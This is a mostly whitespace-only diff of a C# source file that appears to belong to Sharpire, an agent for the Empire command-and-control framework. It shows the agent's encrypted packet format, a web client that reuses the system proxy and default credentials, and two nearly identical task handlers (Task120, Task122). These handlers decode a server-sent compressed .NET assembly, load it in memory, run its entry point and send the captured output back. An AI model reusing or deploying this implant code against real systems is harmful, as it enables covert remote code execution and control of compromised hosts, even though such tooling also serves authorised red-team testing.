@@ -13,75 +13,75 @@ using ChaChaEncryption;
 
 namespace Sharpire
 {
-/*
+    /*
 
-Packet handling functionality for Empire.
+    Packet handling functionality for Empire.
 
-Defines packet types, builds tasking packets and parses result packets.
+    Defines packet types, builds tasking packets and parses result packets.
 
-Packet format:
+    Packet format:
 
-Nonce: Nonce used by ChaCha20Poly1305
-ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
-AESc = AES encrypted using the client's session key
-ChaCha20(RoutingData): Encrypted RoutingData
-Poly1305(RoutingData): Poly1305 tag of RoutingData
-
-
-    Routing Packet:
-    +---------+--------------------------------+--------------------------+
-    |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
-    +---------+--------------------------------+--------------------------+
-    |    12   |                32              |          length          |
-    +---------+--------------------------------+--------------------------+
-
-        ChaCha20+Poly1305(RoutingData):
-        +---------------------------+---------------------------+
-        |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
-        +---------------------------+---------------------------+
-        |           16              |            16             |
-        +---------------------------+---------------------------+
-
-            ChaCha20(RoutingData):
-            +-----------+------+------+-------+--------+
-            | SessionID | Lang | Meta | Extra | Length |
-            +-----------+------+------+-------+--------+
-            |    8      |  1   |  1   |   2   |    4   |
-            +-----------+------+------+-------+--------+
-
-    SessionID = the sessionID that the packet is bound for
-    Lang = indicates the language used
-    Meta = indicates staging req/tasking req/result post/etc.
-    Extra = reserved for future expansion
+    Nonce: Nonce used by ChaCha20Poly1305
+    ChaCha20Poly1305(Routing Data): Encrypted RoutingData with associated Poly1305 tag
+    AESc = AES encrypted using the client's session key
+    ChaCha20(RoutingData): Encrypted RoutingData
+    Poly1305(RoutingData): Poly1305 tag of RoutingData
 
 
-    AESc(client data)
-    +--------+-----------------+-------+
-    | AES IV | Enc Packet Data | HMACc |
-    +--------+-----------------+-------+
-    |   16   |   % 16 bytes    |  10   |
-    +--------+-----------------+-------+
+        Routing Packet:
+        +---------+--------------------------------+--------------------------+
+        |  Nonce  | ChaCha20+Poly1305(RoutingData) | AESc(client packet data) | ...
+        +---------+--------------------------------+--------------------------+
+        |    12   |                32              |          length          |
+        +---------+--------------------------------+--------------------------+
 
-    Client data decrypted:
-    +------+--------+--------------------+----------+---------+-----------+
-    | Type | Length | total # of packets | packet # | task ID | task data |
-    +------+--------+--------------------+--------------------+-----------+
-    |  2   |   4    |         2          |    2     |    2    | <Length>  |
-    +------+--------+--------------------+----------+---------+-----------+
+            ChaCha20+Poly1305(RoutingData):
+            +---------------------------+---------------------------+
+            |   ChaCha20(RoutingData)   |   Poly1305(RoutingData)   |
+            +---------------------------+---------------------------+
+            |           16              |            16             |
+            +---------------------------+---------------------------+
 
-    type = packet type
-    total # of packets = number of total packets in the transmission
-    Packet # = where the packet fits in the transmission
-    Task ID = links the tasking to results for deconflict on server side
+                ChaCha20(RoutingData):
+                +-----------+------+------+-------+--------+
+                | SessionID | Lang | Meta | Extra | Length |
+                +-----------+------+------+-------+--------+
+                |    8      |  1   |  1   |   2   |    4   |
+                +-----------+------+------+-------+--------+
+
+        SessionID = the sessionID that the packet is bound for
+        Lang = indicates the language used
+        Meta = indicates staging req/tasking req/result post/etc.
+        Extra = reserved for future expansion
 
 
-    Client *_SAVE packets have the sub format:
+        AESc(client data)
+        +--------+-----------------+-------+
+        | AES IV | Enc Packet Data | HMACc |
+        +--------+-----------------+-------+
+        |   16   |   % 16 bytes    |  10   |
+        +--------+-----------------+-------+
 
-            [15 chars] - save prefix
-            [5 chars]  - extension
-            [X...]     - tasking data
+        Client data decrypted:
+        +------+--------+--------------------+----------+---------+-----------+
+        | Type | Length | total # of packets | packet # | task ID | task data |
+        +------+--------+--------------------+--------------------+-----------+
+        |  2   |   4    |         2          |    2     |    2    | <Length>  |
+        +------+--------+--------------------+----------+---------+-----------+
 
-*/
+        type = packet type
+        total # of packets = number of total packets in the transmission
+        Packet # = where the packet fits in the transmission
+        Task ID = links the tasking to results for deconflict on server side
+
+
+        Client *_SAVE packets have the sub format:
+
+                [15 chars] - save prefix
+                [5 chars]  - extension
+                [X...]     - tasking data
+
+    */
     class Coms
     {
         public SessionInfo sessionInfo;
@@ -269,6 +269,7 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
 
                 using (WebClient webClient = new WebClient())
                 {
+
                     webClient.Proxy = WebRequest.GetSystemWebProxy();
                     webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                     webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
@@ -327,7 +328,7 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
 
         private byte[] ProcessTasking(PACKET packet)
         {
-           
+
             try
             {
                 int type = packet.type;
@@ -693,182 +694,182 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
         }
 
         public Byte[] Task122(PACKET packet)
-	{
-	    const int MAX_MESSAGE_SIZE = 1048576;
-	    string output = "";
-	    object synclock = new object(); // Define synclock for synchronization
-	    
-	    // Split packet data
-	    string[] parts = packet.data.Split(',');
-	    if (parts.Length > 0)
-	    {
-		try
-		{
-		    // Assuming the Base64 encoded JSON is in parts[1]
-		    string base64JsonString = parts[1];
-		    string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
-		    
-		    // Manually parse JSON to extract all values as a generic string array
-		    var parametersList = new List<string>();
-		    jsonString = jsonString.Trim('{', '}'); // Remove braces if present
-		    string[] keyValuePairs = jsonString.Split(',');
-		    
-		    foreach (string pair in keyValuePairs)
-		    {
-		        string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
-		        if (keyValue.Length == 2)
-		        {
-		            string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
-		            parametersList.Add(value);
-		        }
-		    }
-		    
-		    // Convert list to array and log the parsed values
-		    string[] parameters = parametersList.ToArray();
-		    
-		    // Decompress and load the assembly
-		    byte[] compressedBytes = Convert.FromBase64String(parts[0]);
-		    byte[] decompressedBytes = Decompress(compressedBytes);
-		    Assembly agentTask = Assembly.Load(decompressedBytes);
-		    
-		    // Execute assembly and capture output synchronously
-		    using (StringWriter consoleOutput = new StringWriter())
-		    {
-		        TextWriter originalConsoleOut = Console.Out;
-		        try
-		        {
-		            Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
-		            
-		            // Try to find Program class first
-		            Type programType = agentTask.GetType("Program");
-		            
-		            if (programType != null)
-		            {
-		                MethodInfo mainMethod = programType.GetMethod("Main");
-		                if (mainMethod != null)
-		                {
-		                    mainMethod.Invoke(null, new object[] { parameters });
-		                }
-		                else
-		                {
-		                    lock (synclock)
-		                    {
-		                        output += "[ERROR] Main method not found in Program class.\n";
-		                    }
-		                }
-		            }
-		            else
-		            {
-		                // Fallback: Use entry point if Program class not found
-		                MethodInfo entryPoint = agentTask.EntryPoint;
-		                
-		                if (entryPoint != null)
-		                {
-		                    try
-		                    {
-		                        entryPoint.Invoke(null, new object[] { parameters });
-		                    }
-		                    catch (ArgumentException)
-		                    {
-		                        // Try without parameters if string[] doesn't work
-		                        try
-		                        {
-		                            entryPoint.Invoke(null, null);
-		                        }
-		                        catch (ArgumentException)
-		                        {
-		                            // Try with empty string array
-		                            entryPoint.Invoke(null, new object[] { new string[0] });
-		                        }
-		                    }
-		                }
-		                else
-		                {
-		                    lock (synclock)
-		                    {
-		                        output += "[ERROR] No Program class or entry point found in assembly.\n";
-		                    }
-		                }
-		            }
-		        }
-		        catch (TargetInvocationException ex)
-		        {
-		            var innerEx = ex.InnerException;
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] {innerEx?.Message ?? ex.Message}\n";
-		                if (innerEx?.StackTrace != null)
-		                {
-		                    output += $"Stack Trace: {innerEx.StackTrace}\n";
-		                }
-		            }
-		        }
-		        catch (ReflectionTypeLoadException ex)
-		        {
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] ReflectionTypeLoadException: {ex.Message}\n";
-		                foreach (Exception loaderEx in ex.LoaderExceptions)
-		                {
-		                    output += $"Loader Error: {loaderEx?.Message}\n";
-		                }
-		            }
-		        }
-		        catch (ArgumentException ex)
-		        {
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] ArgumentException: {ex.Message}\n";
-		                output += $"Parameter: {ex.ParamName}\n";
-		            }
-		        }
-		        catch (BadImageFormatException ex)
-		        {
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] BadImageFormatException: {ex.Message}\n";
-		                output += "Assembly might be corrupted or wrong architecture\n";
-		            }
-		        }
-		        catch (FileLoadException ex)
-		        {
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] FileLoadException: {ex.Message}\n";
-		                output += $"File: {ex.FileName}\n";
-		            }
-		        }
-		        catch (Exception ex)
-		        {
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] {ex.GetType().Name}: {ex.Message}\n";
-		                output += $"Stack Trace: {ex.StackTrace}\n";
-		            }
-		        }
-		        finally
-		        {
-		            Console.SetOut(originalConsoleOut); // Restore original Console.Out
-		        }
-		        
-		        lock (synclock) // Safely add console output
-		        {
-		            output += consoleOutput.ToString();
-		        }
-		    }
-		    
-		    // Return the captured output to the agent
-		    return EncodePacket(packet.type, output, packet.taskId);
-		}
-		catch (Exception ex)
-		{
-		    string errorOutput = $"[OUTER ERROR] {ex.GetType().Name}: {ex.Message}\n{ex.StackTrace}\n";
-		    return EncodePacket(packet.type, errorOutput, packet.taskId);
-		}
-	    }
-	    
-	    return EncodePacket(packet.type, "[ERROR] Invalid packet data", packet.taskId);
-	}
+        {
+            const int MAX_MESSAGE_SIZE = 1048576;
+            string output = "";
+            object synclock = new object(); // Define synclock for synchronization
+
+            // Split packet data
+            string[] parts = packet.data.Split(',');
+            if (parts.Length > 0)
+            {
+                try
+                {
+                    // Assuming the Base64 encoded JSON is in parts[1]
+                    string base64JsonString = parts[1];
+                    string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
+
+                    // Manually parse JSON to extract all values as a generic string array
+                    var parametersList = new List<string>();
+                    jsonString = jsonString.Trim('{', '}'); // Remove braces if present
+                    string[] keyValuePairs = jsonString.Split(',');
+
+                    foreach (string pair in keyValuePairs)
+                    {
+                        string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
+                        if (keyValue.Length == 2)
+                        {
+                            string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
+                            parametersList.Add(value);
+                        }
+                    }
+
+                    // Convert list to array and log the parsed values
+                    string[] parameters = parametersList.ToArray();
+
+                    // Decompress and load the assembly
+                    byte[] compressedBytes = Convert.FromBase64String(parts[0]);
+                    byte[] decompressedBytes = Decompress(compressedBytes);
+                    Assembly agentTask = Assembly.Load(decompressedBytes);
+
+                    // Execute assembly and capture output synchronously
+                    using (StringWriter consoleOutput = new StringWriter())
+                    {
+                        TextWriter originalConsoleOut = Console.Out;
+                        try
+                        {
+                            Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
+
+                            // Try to find Program class first
+                            Type programType = agentTask.GetType("Program");
+
+                            if (programType != null)
+                            {
+                                MethodInfo mainMethod = programType.GetMethod("Main");
+                                if (mainMethod != null)
+                                {
+                                    mainMethod.Invoke(null, new object[] { parameters });
+                                }
+                                else
+                                {
+                                    lock (synclock)
+                                    {
+                                        output += "[ERROR] Main method not found in Program class.\n";
+                                    }
+                                }
+                            }
+                            else
+                            {
+                                // Fallback: Use entry point if Program class not found
+                                MethodInfo entryPoint = agentTask.EntryPoint;
+
+                                if (entryPoint != null)
+                                {
+                                    try
+                                    {
+                                        entryPoint.Invoke(null, new object[] { parameters });
+                                    }
+                                    catch (ArgumentException)
+                                    {
+                                        // Try without parameters if string[] doesn't work
+                                        try
+                                        {
+                                            entryPoint.Invoke(null, null);
+                                        }
+                                        catch (ArgumentException)
+                                        {
+                                            // Try with empty string array
+                                            entryPoint.Invoke(null, new object[] { new string[0] });
+                                        }
+                                    }
+                                }
+                                else
+                                {
+                                    lock (synclock)
+                                    {
+                                        output += "[ERROR] No Program class or entry point found in assembly.\n";
+                                    }
+                                }
+                            }
+                        }
+                        catch (TargetInvocationException ex)
+                        {
+                            var innerEx = ex.InnerException;
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] {innerEx?.Message ?? ex.Message}\n";
+                                if (innerEx?.StackTrace != null)
+                                {
+                                    output += $"Stack Trace: {innerEx.StackTrace}\n";
+                                }
+                            }
+                        }
+                        catch (ReflectionTypeLoadException ex)
+                        {
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] ReflectionTypeLoadException: {ex.Message}\n";
+                                foreach (Exception loaderEx in ex.LoaderExceptions)
+                                {
+                                    output += $"Loader Error: {loaderEx?.Message}\n";
+                                }
+                            }
+                        }
+                        catch (ArgumentException ex)
+                        {
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] ArgumentException: {ex.Message}\n";
+                                output += $"Parameter: {ex.ParamName}\n";
+                            }
+                        }
+                        catch (BadImageFormatException ex)
+                        {
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] BadImageFormatException: {ex.Message}\n";
+                                output += "Assembly might be corrupted or wrong architecture\n";
+                            }
+                        }
+                        catch (FileLoadException ex)
+                        {
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] FileLoadException: {ex.Message}\n";
+                                output += $"File: {ex.FileName}\n";
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] {ex.GetType().Name}: {ex.Message}\n";
+                                output += $"Stack Trace: {ex.StackTrace}\n";
+                            }
+                        }
+                        finally
+                        {
+                            Console.SetOut(originalConsoleOut); // Restore original Console.Out
+                        }
+
+                        lock (synclock) // Safely add console output
+                        {
+                            output += consoleOutput.ToString();
+                        }
+                    }
+
+                    // Return the captured output to the agent
+                    return EncodePacket(packet.type, output, packet.taskId);
+                }
+                catch (Exception ex)
+                {
+                    string errorOutput = $"[OUTER ERROR] {ex.GetType().Name}: {ex.Message}\n{ex.StackTrace}\n";
+                    return EncodePacket(packet.type, errorOutput, packet.taskId);
+                }
+            }
+
+            return EncodePacket(packet.type, "[ERROR] Invalid packet data", packet.taskId);
+        }
 
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -907,182 +908,182 @@ Poly1305(RoutingData): Poly1305 tag of RoutingData
         // Run an Agent Job
         ////////////////////////////////////////////////////////////////////////////////
         public Byte[] Task120(PACKET packet)
-	{
-	    const int MAX_MESSAGE_SIZE = 1048576;
-	    string output = "";
-	    object synclock = new object(); // Define synclock for synchronization
-	    
-	    // Split packet data
-	    string[] parts = packet.data.Split(',');
-	    if (parts.Length > 0)
-	    {
-		try
-		{
-		    // Assuming the Base64 encoded JSON is in parts[1]
-		    string base64JsonString = parts[1];
-		    string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
-		    
-		    // Manually parse JSON to extract all values as a generic string array
-		    var parametersList = new List<string>();
-		    jsonString = jsonString.Trim('{', '}'); // Remove braces if present
-		    string[] keyValuePairs = jsonString.Split(',');
-		    
-		    foreach (string pair in keyValuePairs)
-		    {
-		        string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
-		        if (keyValue.Length == 2)
-		        {
-		            string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
-		            parametersList.Add(value);
-		        }
-		    }
-		    
-		    // Convert list to array and log the parsed values
-		    string[] parameters = parametersList.ToArray();
-		    
-		    // Decompress and load the assembly
-		    byte[] compressedBytes = Convert.FromBase64String(parts[0]);
-		    byte[] decompressedBytes = Decompress(compressedBytes);
-		    Assembly agentTask = Assembly.Load(decompressedBytes);
-		    
-		    // Execute assembly and capture output synchronously
-		    using (StringWriter consoleOutput = new StringWriter())
-		    {
-		        TextWriter originalConsoleOut = Console.Out;
-		        try
-		        {
-		            Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
-		            
-		            // Try to find Program class first
-		            Type programType = agentTask.GetType("Program");
-		            
-		            if (programType != null)
-		            {
-		                MethodInfo mainMethod = programType.GetMethod("Main");
-		                if (mainMethod != null)
-		                {
-		                    mainMethod.Invoke(null, new object[] { parameters });
-		                }
-		                else
-		                {
-		                    lock (synclock)
-		                    {
-		                        output += "[ERROR] Main method not found in Program class.\n";
-		                    }
-		                }
-		            }
-		            else
-		            {
-		                // Fallback: Use entry point if Program class not found
-		                MethodInfo entryPoint = agentTask.EntryPoint;
-		                
-		                if (entryPoint != null)
-		                {
-		                    try
-		                    {
-		                        entryPoint.Invoke(null, new object[] { parameters });
-		                    }
-		                    catch (ArgumentException)
-		                    {
-		                        // Try without parameters if string[] doesn't work
-		                        try
-		                        {
-		                            entryPoint.Invoke(null, null);
-		                        }
-		                        catch (ArgumentException)
-		                        {
-		                            // Try with empty string array
-		                            entryPoint.Invoke(null, new object[] { new string[0] });
-		                        }
-		                    }
-		                }
-		                else
-		                {
-		                    lock (synclock)
-		                    {
-		                        output += "[ERROR] No Program class or entry point found in assembly.\n";
-		                    }
-		                }
-		            }
-		        }
-		        catch (TargetInvocationException ex)
-		        {
-		            var innerEx = ex.InnerException;
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] {innerEx?.Message ?? ex.Message}\n";
-		                if (innerEx?.StackTrace != null)
-		                {
-		                    output += $"Stack Trace: {innerEx.StackTrace}\n";
-		                }
-		            }
-		        }
-		        catch (ReflectionTypeLoadException ex)
-		        {
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] ReflectionTypeLoadException: {ex.Message}\n";
-		                foreach (Exception loaderEx in ex.LoaderExceptions)
-		                {
-		                    output += $"Loader Error: {loaderEx?.Message}\n";
-		                }
-		            }
-		        }
-		        catch (ArgumentException ex)
-		        {
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] ArgumentException: {ex.Message}\n";
-		                output += $"Parameter: {ex.ParamName}\n";
-		            }
-		        }
-		        catch (BadImageFormatException ex)
-		        {
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] BadImageFormatException: {ex.Message}\n";
-		                output += "Assembly might be corrupted or wrong architecture\n";
-		            }
-		        }
-		        catch (FileLoadException ex)
-		        {
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] FileLoadException: {ex.Message}\n";
-		                output += $"File: {ex.FileName}\n";
-		            }
-		        }
-		        catch (Exception ex)
-		        {
-		            lock (synclock)
-		            {
-		                output += $"[ERROR] {ex.GetType().Name}: {ex.Message}\n";
-		                output += $"Stack Trace: {ex.StackTrace}\n";
-		            }
-		        }
-		        finally
-		        {
-		            Console.SetOut(originalConsoleOut); // Restore original Console.Out
-		        }
-		        
-		        lock (synclock) // Safely add console output
-		        {
-		            output += consoleOutput.ToString();
-		        }
-		    }
-		    
-		    // Return the captured output to the agent
-		    return EncodePacket(packet.type, output, packet.taskId);
-		}
-		catch (Exception ex)
-		{
-		    string errorOutput = $"[OUTER ERROR] {ex.GetType().Name}: {ex.Message}\n{ex.StackTrace}\n";
-		    return EncodePacket(packet.type, errorOutput, packet.taskId);
-		}
-	    }
-	    
-	    return EncodePacket(packet.type, "[ERROR] Invalid packet data", packet.taskId);
-	}
+        {
+            const int MAX_MESSAGE_SIZE = 1048576;
+            string output = "";
+            object synclock = new object(); // Define synclock for synchronization
+
+            // Split packet data
+            string[] parts = packet.data.Split(',');
+            if (parts.Length > 0)
+            {
+                try
+                {
+                    // Assuming the Base64 encoded JSON is in parts[1]
+                    string base64JsonString = parts[1];
+                    string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
+
+                    // Manually parse JSON to extract all values as a generic string array
+                    var parametersList = new List<string>();
+                    jsonString = jsonString.Trim('{', '}'); // Remove braces if present
+                    string[] keyValuePairs = jsonString.Split(',');
+
+                    foreach (string pair in keyValuePairs)
+                    {
+                        string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
+                        if (keyValue.Length == 2)
+                        {
+                            string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
+                            parametersList.Add(value);
+                        }
+                    }
+
+                    // Convert list to array and log the parsed values
+                    string[] parameters = parametersList.ToArray();
+
+                    // Decompress and load the assembly
+                    byte[] compressedBytes = Convert.FromBase64String(parts[0]);
+                    byte[] decompressedBytes = Decompress(compressedBytes);
+                    Assembly agentTask = Assembly.Load(decompressedBytes);
+
+                    // Execute assembly and capture output synchronously
+                    using (StringWriter consoleOutput = new StringWriter())
+                    {
+                        TextWriter originalConsoleOut = Console.Out;
+                        try
+                        {
+                            Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
+
+                            // Try to find Program class first
+                            Type programType = agentTask.GetType("Program");
+
+                            if (programType != null)
+                            {
+                                MethodInfo mainMethod = programType.GetMethod("Main");
+                                if (mainMethod != null)
+                                {
+                                    mainMethod.Invoke(null, new object[] { parameters });
+                                }
+                                else
+                                {
+                                    lock (synclock)
+                                    {
+                                        output += "[ERROR] Main method not found in Program class.\n";
+                                    }
+                                }
+                            }
+                            else
+                            {
+                                // Fallback: Use entry point if Program class not found
+                                MethodInfo entryPoint = agentTask.EntryPoint;
+
+                                if (entryPoint != null)
+                                {
+                                    try
+                                    {
+                                        entryPoint.Invoke(null, new object[] { parameters });
+                                    }
+                                    catch (ArgumentException)
+                                    {
+                                        // Try without parameters if string[] doesn't work
+                                        try
+                                        {
+                                            entryPoint.Invoke(null, null);
+                                        }
+                                        catch (ArgumentException)
+                                        {
+                                            // Try with empty string array
+                                            entryPoint.Invoke(null, new object[] { new string[0] });
+                                        }
+                                    }
+                                }
+                                else
+                                {
+                                    lock (synclock)
+                                    {
+                                        output += "[ERROR] No Program class or entry point found in assembly.\n";
+                                    }
+                                }
+                            }
+                        }
+                        catch (TargetInvocationException ex)
+                        {
+                            var innerEx = ex.InnerException;
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] {innerEx?.Message ?? ex.Message}\n";
+                                if (innerEx?.StackTrace != null)
+                                {
+                                    output += $"Stack Trace: {innerEx.StackTrace}\n";
+                                }
+                            }
+                        }
+                        catch (ReflectionTypeLoadException ex)
+                        {
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] ReflectionTypeLoadException: {ex.Message}\n";
+                                foreach (Exception loaderEx in ex.LoaderExceptions)
+                                {
+                                    output += $"Loader Error: {loaderEx?.Message}\n";
+                                }
+                            }
+                        }
+                        catch (ArgumentException ex)
+                        {
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] ArgumentException: {ex.Message}\n";
+                                output += $"Parameter: {ex.ParamName}\n";
+                            }
+                        }
+                        catch (BadImageFormatException ex)
+                        {
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] BadImageFormatException: {ex.Message}\n";
+                                output += "Assembly might be corrupted or wrong architecture\n";
+                            }
+                        }
+                        catch (FileLoadException ex)
+                        {
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] FileLoadException: {ex.Message}\n";
+                                output += $"File: {ex.FileName}\n";
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] {ex.GetType().Name}: {ex.Message}\n";
+                                output += $"Stack Trace: {ex.StackTrace}\n";
+                            }
+                        }
+                        finally
+                        {
+                            Console.SetOut(originalConsoleOut); // Restore original Console.Out
+                        }
+
+                        lock (synclock) // Safely add console output
+                        {
+                            output += consoleOutput.ToString();
+                        }
+                    }
+
+                    // Return the captured output to the agent
+                    return EncodePacket(packet.type, output, packet.taskId);
+                }
+                catch (Exception ex)
+                {
+                    string errorOutput = $"[OUTER ERROR] {ex.GetType().Name}: {ex.Message}\n{ex.StackTrace}\n";
+                    return EncodePacket(packet.type, errorOutput, packet.taskId);
+                }
+            }
+
+            return EncodePacket(packet.type, "[ERROR] Invalid packet data", packet.taskId);
+        }
 
         //Decompress function may want to move this somewhere else at some point
         //taken from Covenant https://github.com/cobbr/Covenant/tree/master/Covenant
